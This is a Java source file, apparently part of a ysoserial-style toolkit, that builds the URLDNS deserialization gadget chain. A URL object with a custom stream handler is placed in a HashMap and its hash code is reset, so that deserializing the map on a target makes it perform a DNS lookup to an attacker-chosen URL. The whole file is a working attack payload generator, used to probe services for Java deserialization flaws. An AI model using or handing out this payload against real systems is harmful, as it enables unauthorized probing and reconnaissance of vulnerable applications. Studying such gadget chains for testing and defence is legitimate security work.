package Node.payload;

import Node.node.HashMap_node;
import Node.node.URLStreamHandler_node;
import Node.node.Url_node;
import Node.utils.PayloadRunner;
import Node.utils.Reflections;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;

public class URLDNS1 implements ObjectPayload<Object>{
    public Object getObject(String url) throws Exception {

        //URLStreamHandler_node 节点1
        URLStreamHandler handler=URLStreamHandler_node.return_node();

        //URL 节点2
        URL url1= Url_node.return_node(url,handler);

        //HashMap 最后节点
        HashMap hashMap= HashMap_node.return_node();
        hashMap.put(url1,url);

        //节点2 触发调整
        Url_node.return_hashcode(url1);

        return hashMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(URLDNS1.class, args);
    }


}
